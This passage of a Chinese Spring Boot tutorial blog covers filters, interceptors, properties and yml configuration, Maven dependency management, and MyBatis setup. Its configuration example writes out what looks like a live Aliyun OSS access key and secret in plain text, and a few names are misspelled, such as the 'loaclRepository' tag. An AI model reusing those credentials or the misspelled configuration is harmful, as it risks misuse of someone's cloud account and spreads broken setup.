class="comment">//拦截到请求之后调用, 调用多次</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Demo 拦截到了请求...放行前逻辑&quot;</span>);</span><br><span class="line">        <span class="comment">//放行</span></span><br><span class="line">        chain.doFilter(request,response);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;Demo 拦截到了请求...放行后逻辑&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">//销毁方法, 只调用一次</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;destroy 销毁方法执行了&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//引导类</span></span><br><span class="line"><span class="meta">@ServletComponentScan</span> <span class="comment">//开启了对servlet组件的支持</span></span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TliasWebManagementApplication</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        SpringApplication.run(TliasWebManagementApplication.class, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Filter执行流程"><a href="#Filter执行流程" class="headerlink" title="Filter执行流程"></a>Filter执行流程</h2><p>放行后访问对应资源，资源访问完成后，还会回到Filter中，并且从chain.doFilter()方法之后开始执行</p><h2 id="Filter拦截路径"><a href="#Filter拦截路径" class="headerlink" title="Filter拦截路径"></a>Filter拦截路径</h2><table><thead><tr><th>拦截路径</th><th>urlPatterns值</th><th>含义</th></tr></thead><tbody><tr><td>拦截具体路径</td><td>&#x2F;login</td><td>只有访问 &#x2F;login 路径时，才会被拦截</td></tr><tr><td>目录拦截</td><td>&#x2F;emps&#x2F;*</td><td>访问&#x2F;emps下的所有资源，都会被拦截</td></tr><tr><td>拦截所有</td><td>&#x2F;*</td><td>访问所有资源，都会被拦截</td></tr></tbody></table><h2 id="过滤器链"><a href="#过滤器链" class="headerlink" title="过滤器链"></a>过滤器链</h2><p>介绍：一个web应用中，可以配置多个过滤器，这多个过滤器就形成了一个过滤器链，前面的过滤器执行chain.doFilter()，实际上就是把请求交给下一个过滤器</p><p>顺序：注解配置的Filter，优先级是按照过滤器类名（字符串）的自然排序，也就是字母排序。</p><h1 id="拦截器Interceptor"><a href="#拦截器Interceptor" class="headerlink" title="拦截器Interceptor"></a>拦截器Interceptor</h1><p>概念：是一种动态拦截方法调用的机制，类似于过滤器。Spring框架中提供的，用来动态拦截控制器方法的执行。作用：拦截请求，在指定的方法调用前后，根据业务需要执行预先设定的代码。</p><h2 id="拦截器实现"><a href="#拦截器实现" class="headerlink" title="拦截器实现"></a>拦截器实现</h2><p>1.定义拦截器，实现HandlerInterceptor接口，并重写其所有方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LoginCheckInterceptor</span> <span class="keyword">implements</span> <span class="title class_">HandlerInterceptor</span> &#123;</span><br><span class="line"><span class="meta">@Override</span> <span class="comment">//目标资源方法运行前运行, 返回true: 放行, 放回false, 不放行</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">preHandle</span><span class="params">(HttpServletRequest req, HttpServletResponse resp, Object handler)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;preHandle ...&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">     <span class="meta">@Override</span> <span class="comment">//目标资源方法运行后运行</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">postHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;postHandle ...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">//视图渲染完毕后运行, 最后运行</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">afterCompletion</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;afterCompletion...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2.注册拦截器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span> <span class="comment">//配置类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WebConfig</span> <span class="keyword">implements</span> <span class="title class_">WebMvcConfigurer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> LoginCheckInterceptor loginCheckInterceptor;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="comment">//注册拦截器并指定拦截器的拦截路径</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addInterceptors</span><span class="params">(InterceptorRegistry registry)</span> &#123;</span><br><span class="line">registry.addInterceptor(loginCheckInterceptor).addPathPatterns(<span class="string">&quot;/**&quot;</span>).excludePathPatterns(<span class="string">&quot;/login&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="拦截器拦截路径"><a href="#拦截器拦截路径" class="headerlink" title="拦截器拦截路径"></a>拦截器拦截路径</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span> <span class="comment">//配置类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WebConfig</span> <span class="keyword">implements</span> <span class="title class_">WebMvcConfigurer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> LoginCheckInterceptor loginCheckInterceptor;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addInterceptors</span><span class="params">(InterceptorRegistry registry)</span> &#123;</span><br><span class="line">        registry.addInterceptor(loginCheckInterceptor).addPathPatterns(<span class="string">&quot;/**&quot;</span>).excludePathPatterns(<span class="string">&quot;/login&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>addPathPatterns表示拦截哪些资源，excludePathPatterns表示不拦截哪些资源</p><table><thead><tr><th>拦截路径</th><th>含义</th><th>举例</th></tr></thead><tbody><tr><td>&#x2F;*</td><td>一级路径</td><td>能匹配&#x2F;depts，&#x2F;emps，&#x2F;login，不能匹配 &#x2F;depts&#x2F;1</td></tr><tr><td>&#x2F;**</td><td>任意级路径</td><td>能匹配&#x2F;depts，&#x2F;depts&#x2F;1，&#x2F;depts&#x2F;1&#x2F;2</td></tr><tr><td>&#x2F;depts&#x2F;*</td><td>&#x2F;depts下的一级路径</td><td>能匹配&#x2F;depts&#x2F;1，不能匹配&#x2F;depts&#x2F;1&#x2F;2，&#x2F;depts</td></tr><tr><td>&#x2F;depts&#x2F;**</td><td>&#x2F;depts下的任意级路径</td><td>能匹配&#x2F;depts，&#x2F;depts&#x2F;1，&#x2F;depts&#x2F;1&#x2F;2，不能匹配&#x2F;emps&#x2F;1</td></tr></tbody></table><h2 id="拦截器执行流程"><a href="#拦截器执行流程" class="headerlink" title="拦截器执行流程"></a>拦截器执行流程</h2><p><a href="https://smms.app/image/3JgFyWCdPcHBDtN" target="_blank"><img src="https://s2.loli.net/2024/01/20/3JgFyWCdPcHBDtN.png" alt="interceptor2.png"></a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">过滤器和拦截器的区别：</span><br><span class="line"></span><br><span class="line">接口规范不同：过滤器需要实现Filter接口，而拦截器需要实现HandlerInterceptor接口。</span><br><span class="line"></span><br><span class="line">拦截范围不同：过滤器Filter会拦截所有的资源，而Interceptor只会拦截Spring环境中的资源。</span><br></pre></td></tr></table></figure><h1 id="SpringBoot配置文件"><a href="#SpringBoot配置文件" class="headerlink" title="SpringBoot配置文件"></a>SpringBoot配置文件</h1><h2 id="参数配置化"><a href="#参数配置化" class="headerlink" title="参数配置化"></a>参数配置化</h2><p>application.properties</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">aliyun.oss.endpoint=https://oss-cn-hangzhou.aliyuncs.com</span><br><span class="line">aliyun.oss.accessKeyId=LTAI4GCH1vX6DKqJWxd6nEuW</span><br><span class="line">aliyun.oss.accessKeySecret=yBshYweHOpqDuhCArrVHwIiBKpyqSL</span><br><span class="line">aliyun.oss.bucketName=web-tlias</span><br></pre></td></tr></table></figure><p>@Value 注解通常用于外部配置的属性注入，具体用法为： @Value(“${配置文件中的key}”)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AliOSSUtils</span> &#123;</span><br><span class="line"><span class="meta">@Value(&quot;$&#123;aliyun.oss.endpoint&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String endpoint ;</span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;aliyun.oss.accessKeyId&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String accessKeyId ;</span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;aliyun.oss.accessKeySecret&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String accessKeySecret ;</span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;aliyun.oss.bucketName&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String bucketName ;</span><br></pre></td></tr></table></figure><h2 id="yml配置文件"><a href="#yml配置文件" class="headerlink" title="yml配置文件"></a>yml配置文件</h2><p>springboot配置文件可以是.properties文件，也可以是yml文件或者yaml文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">//application.properties</span><br><span class="line">server.port=8080</span><br><span class="line">server.address=127.0.0.1</span><br><span class="line"></span><br><span class="line">//application.yml</span><br><span class="line">server:</span><br><span class="line">   port:  8080</span><br><span class="line">   address: 127.0.0.1</span><br><span class="line"></span><br><span class="line">//application.yaml</span><br><span class="line">server:</span><br><span class="line">   port:  8080</span><br><span class="line">   address: 127.0.0.1</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">yml文件配置规范：</span><br><span class="line">    1.大小写敏感</span><br><span class="line">    2.数值前边必须有空格，作为分隔符</span><br><span class="line">    3.使用缩进表示层级关系，缩进时，不允许使用Tab键，只能用空格（idea中会自动将Tab转换为空格）</span><br><span class="line">    4.缩进的空格数目不重要，只要相同层级的元素左侧对齐即可</span><br><span class="line">    5.# 表示注释，从这个字符一直到行尾，都会被解析器忽略</span><br></pre></td></tr></table></figure><p>yml数据格式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">//对象/Map集合：</span><br><span class="line">user:</span><br><span class="line">   name: zhangsan</span><br><span class="line">   age: 18</span><br><span class="line">   password: 123456</span><br><span class="line"></span><br><span class="line">//数组/List/Set集合：</span><br><span class="line">hobby:</span><br><span class="line">   - java</span><br><span class="line">   - game</span><br><span class="line">   - sport</span><br></pre></td></tr></table></figure><h2 id="ConfigurationProperties注解"><a href="#ConfigurationProperties注解" class="headerlink" title="@ConfigurationProperties注解"></a>@ConfigurationProperties注解</h2><p>@Value注解只能一个一个的进行外部属性的注入。</p><p>@ConfigurationProperties可以批量的将外部的属性配置注入到bean对象的属性中。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AliOSSUtils</span> &#123;</span><br><span class="line"><span class="comment">//从容器中获取Bean</span></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> AliOSSProperties aliOSSProperties;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">@Data自动设置get set方法</span></span><br><span class="line"><span class="comment">@Component将对象装入容器</span></span><br><span class="line"><span class="comment">@ConfigurationProperties(prefix = &quot;aliyun.oss&quot;)设置属性所在的包及属性名</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@ConfigurationProperties(prefix = &quot;aliyun.oss&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AliOSSProperties</span> &#123;</span><br><span class="line">    <span class="comment">//要求属性名和配置文件的属性名一致</span></span><br><span class="line">    <span class="keyword">private</span> String endpoint;</span><br><span class="line">    <span class="keyword">private</span> String accessKeyId;</span><br><span class="line">    <span class="keyword">private</span> String accessKeySecret;</span><br><span class="line">    <span class="keyword">private</span> String bucketName;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="maven基础"><a href="#maven基础" class="headerlink" title="maven基础"></a>maven基础</h1><h2 id="What-is-maven"><a href="#What-is-maven" class="headerlink" title="What is maven?"></a>What is maven?</h2><p>管理和构建java项目的工具</p><h2 id="Use-of-maven"><a href="#Use-of-maven" class="headerlink" title="Use of maven"></a>Use of maven</h2><h3 id="依赖管理"><a href="#依赖管理" class="headerlink" title="依赖管理"></a>依赖管理</h3><p>避免手动导包的繁琐以及不同jar包的版本配套问题，如果在后期要升级某个包，相关的包都得升级</p><p>在maven工程下，只需要在pom.xml中配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">...</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependencies&gt;</span><br></pre></td></tr></table></figure><h3 id="统一项目结构"><a href="#统一项目结构" class="headerlink" title="统一项目结构"></a>统一项目结构</h3><p>不同开发工具（eclipse、IDEA）开发出的java项目结构不一样，而只要使用maven项目结构，生成的工程结构都是一样的</p><p>目录结构</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">└─src</span><br><span class="line">    ├─main       （实际项目资源）</span><br><span class="line">    ├─────java    （java源代码目录）</span><br><span class="line">    ├─────resources（配置文件目录）</span><br><span class="line">    ├─test        （测试项目资源）</span><br><span class="line">    ├─────java</span><br><span class="line">    ├─────resources</span><br><span class="line">    └─pom.xml  （项目配置文件）</span><br></pre></td></tr></table></figure><h3 id="项目构建"><a href="#项目构建" class="headerlink" title="项目构建"></a>项目构建</h3><p>使用maven可以全流程进行编译、测试、打包、发布等过程，减少工作量，编译运行之后会新建一个target目录，存放程序的字节码</p><h2 id="maven的安装"><a href="#maven的安装" class="headerlink" title="maven的安装"></a>maven的安装</h2><h3 id="普通安装"><a href="#普通安装" class="headerlink" title="普通安装"></a>普通安装</h3><p>1.解压apache-maven-x.x.x-bin.zip</p><p>2.配置本地仓库，修改conf&#x2F;settings.xml中的<code>&lt;loaclRepository&gt;</code>为一个指定目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;loaclRepository&gt;E:/develop/apache-maven-x.x.x/mvn_repo&lt;/loaclRepository&gt;</span><br></pre></td></tr></table></figure><p>3.配置阿里云镜像，修改conf&#x2F;settings.xml中的<code>&lt;mirrors&gt;</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;mirror&gt;</span><br><span class="line">&lt;id&gt;alimaven&lt;/id&gt;</span><br><span class="line">&lt;name&gt;aliyun maven&lt;/name&gt;</span><br><span class="line">&lt;url&gt;http://maven.aliyun.com/nexus/content/groups/public/&lt;/url&gt;</span><br><span class="line">&lt;mirrorOf&gt;central&lt;/mirrorOf&gt;</span><br><span class="line">&lt;/mirror&gt;</span><br></pre></td></tr></table></figure><p>4.配置环境变量，MAVEN_HOME为maven的解压目录，并将其bin目录加入PATH变量</p><h3 id="IDEA集成maven"><a href="#IDEA集成maven" class="headerlink" title="IDEA集成maven"></a>IDEA集成maven</h3><h4 id="配置maven环境（当前工程）"><a href="#配置maven环境（当前工程）" class="headerlink" title="配置maven环境（当前工程）"></a>配置maven环境（当前工程）</h4><p>选择 IDEA中 File –&gt; Settings –&gt; Build,Execution,Deployment –&gt; Build Tools –&gt; Maven</p><p>设置 IDEA 使用本地安装的 Maven，并修改配置文件及本地仓库路径，查看File –&gt; Settings –&gt; Build,Execution,Deployment –&gt; Build Tools –&gt; Maven–&gt;Runner中的Java版本File –&gt; Settings –&gt; Build,Execution,Deployment –&gt;Compiler–&gt; Java Compiler中的Java版本</p><h4 id="配置maven环境（全局）"><a href="#配置maven环境（全局）" class="headerlink" title="配置maven环境（全局）"></a>配置maven环境（全局）</h4><p>点击close Project–&gt;Customize–&gt;All settings，后续同上</p><h2 id="Maven坐标"><a href="#Maven坐标" class="headerlink" title="Maven坐标"></a>Maven坐标</h2><p>新建maven项目时会需要填写项目的GroupId，AircraftId以及Verison，叫maven中的坐标</p><p>Maven 中的坐标是资源的唯一标识，通过该坐标可以唯一定位资源位置。使用坐标来定义项目或引入项目中需要的依赖。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">groupId：定义当前Maven项目隶属组织名称（通常是域名反写，例如：com.itheima）</span><br><span class="line">artifactId：定义当前Maven项目名称（通常是模块名称，例如 order-service、goods-service）</span><br><span class="line">version：定义当前项目版本号</span><br><span class="line">pom.xml</span><br><span class="line">&lt;groupId&gt;yu1e.com&lt;/groupId&gt;</span><br><span class="line">&lt;artifactId&gt;mavenTest01&lt;/artifactId&gt;</span><br><span class="line">&lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;</span><br></pre></td></tr></table></figure><h2 id="IDEA导入maven项目"><a href="#IDEA导入maven项目" class="headerlink" title="IDEA导入maven项目"></a>IDEA导入maven项目</h2><h3 id="方法一-1"><a href="#方法一-1" class="headerlink" title="方法一"></a>方法一</h3><p>打开IDEA，选择右侧Maven面板，点击 + 号，选中对应项目的pom.xml文件，双击即可，如果找不到，就在View–&gt;Appearance–&gt;Windows Tool Bars勾上</p><p>删除maven模块，右键选择Remove module</p><h3 id="方法二-1"><a href="#方法二-1" class="headerlink" title="方法二"></a>方法二</h3><p>File–&gt;Project Structure–&gt;Project Settings–&gt;Modules–&gt;+–&gt;Import Modules–&gt;选择pom.xml</p><h2 id="依赖管理-1"><a href="#依赖管理-1" class="headerlink" title="依赖管理"></a>依赖管理</h2><h3 id="依赖配置"><a href="#依赖配置" class="headerlink" title="依赖配置"></a>依赖配置</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">依赖：指当前项目运行所需要的jar包，一个项目中可以引入多个依赖。</span><br><span class="line">配置：</span><br><span class="line">1.在 pom.xml 中编写 &lt;dependencies&gt; 标签</span><br><span class="line">2.在 &lt;dependencies&gt; 标签中 使用 &lt;dependency&gt; 引入坐标</span><br><span class="line">3.定义坐标的 groupId，artifactId，version</span><br><span class="line">4.点击刷新按钮，引入最新加入的坐标</span><br></pre></td></tr></table></figure><h3 id="依赖传递"><a href="#依赖传递" class="headerlink" title="依赖传递"></a>依赖传递</h3><p>说白了就是A依赖B，B依赖C，那么A就依赖C</p><p>如果在A的pom.xml中配置依赖项目B，B的pom.xml中依赖项目C，那么A会自动加载C的依赖包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;com.yu1e&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;projectB&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><h3 id="排除依赖"><a href="#排除依赖" class="headerlink" title="排除依赖"></a>排除依赖</h3><p>排除依赖指主动断开依赖的资源，被排除的资源无需指定版本。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">&lt;groupId&gt;com.itheima&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;maven-projectB&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;    </span><br><span class="line">    </span><br><span class="line">    &lt;exclusions&gt;</span><br><span class="line">   &lt;exclusion&gt;</span><br><span class="line">        &lt;groupId&gt;junit&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;junit&lt;/artifactId&gt;</span><br><span class="line">        &lt;/exclusion&gt;</span><br><span class="line">    &lt;/exclusions&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><h3 id="依赖范围"><a href="#依赖范围" class="headerlink" title="依赖范围"></a>依赖范围</h3><p>依赖的jar包，默认情况下，可以在任何地方使用。可以通过 <code>&lt;scope&gt;…&lt;/ scope &gt;</code> 设置其作用范围。作用范围：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">主程序范围有效。（main文件夹范围内）</span><br><span class="line">测试程序范围有效。（test文件夹范围内）</span><br><span class="line">是否参与打包运行，即打包之后生产的文件中有无该依赖。（package指令范围内）</span><br></pre></td></tr></table></figure><table><thead><tr><th>scope值</th><th><strong>主程序</strong></th><th><strong>测试程序</strong></th><th><strong>打包（运行）</strong></th><th><strong>范例</strong></th></tr></thead><tbody><tr><td>compile（默认）</td><td>Y</td><td>Y</td><td>Y</td><td>log4j</td></tr><tr><td>test</td><td>-</td><td>Y</td><td>-</td><td>junit</td></tr><tr><td>provided</td><td>Y</td><td>Y</td><td>-</td><td>servlet-api</td></tr><tr><td>runtime</td><td>-</td><td>Y</td><td>Y</td><td>jdbc驱动</td></tr></tbody></table><h2 id="生命周期"><a href="#生命周期" class="headerlink" title="生命周期"></a>生命周期</h2><p>这里关注的主要是compile（编译项目源代码）、test（运行测试）、package（将编译后的文件打包成jar、war等）、install（安装项目到本地仓库，如果成功，那么本地仓库的路径下应该会有com.yu1e.test这个jar包）</p><h1 id="MyBatis框架使用"><a href="#MyBatis框架使用" class="headerlink" title="MyBatis框架使用"></a>MyBatis框架使用</h1><h2 id="配置mybatis"><a href="#配置mybatis" class="headerlink" title="配置mybatis"></a>配置mybatis</h2><p>在application.properties进行配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">spring.datasource.driver-class-name=com.mysql.cj.jdbc.Driver</span><br><span class="line">spring.datasource.url=jdbc:mysql://localhost:3306/mybatis</span><br><span class="line">spring.datasource.username=root</span><br><span class="line">spring.datasource.password=1234</span><br></pre></td></tr></table></figure><p>定义User类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line"><span class="keyword">private</span> Integer id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> Short age;</span><br><span class="line">    <span class="keyword">private</span> Short gender;</span><br><span class="line">    <span class="keyword">private</span> String phone;</span><br><span class="line">   <span class="comment">//省略 get / set 方法</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注解SQL语句</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Mapper</span><span class="comment">//在运行时，会自动生成该接口的实现类对象(代理对象即Java中的动态代理)，并且将该对象交给IOC容器管理</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserMapper</span> &#123;    </span><br><span class="line">    <span class="meta">@Select(&quot;select *  from user&quot;)</span>    </span><br><span class="line">    <span class="keyword">public</span> List&lt;User&gt; <span class="title function_">list</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行时会自动将执行结果封装到list()方法的返回值中</p><p>mybatis开发中，只需要定义接口不需要实现，mybatis底层会自动实现</p><h2 id="JDBC介绍"><a href="#JDBC介绍" class="headerlink" title="JDBC介绍"></a>JDBC介绍</h2><p>JDBC： ( Java DataBase Connectivity )，就是使用Java语言操作关系型数据库的一套API。</p><p>sun公司官方定义的一套操作所有关系型数据库的规范，即接口。</p><p>各个数据库厂商去实现这套接口，提供数据库驱动jar包。</p><p>我们可以使用这套接口（JDBC）编程，真正执行的代码是驱动jar包中的实现类。</p><figure class="highlight 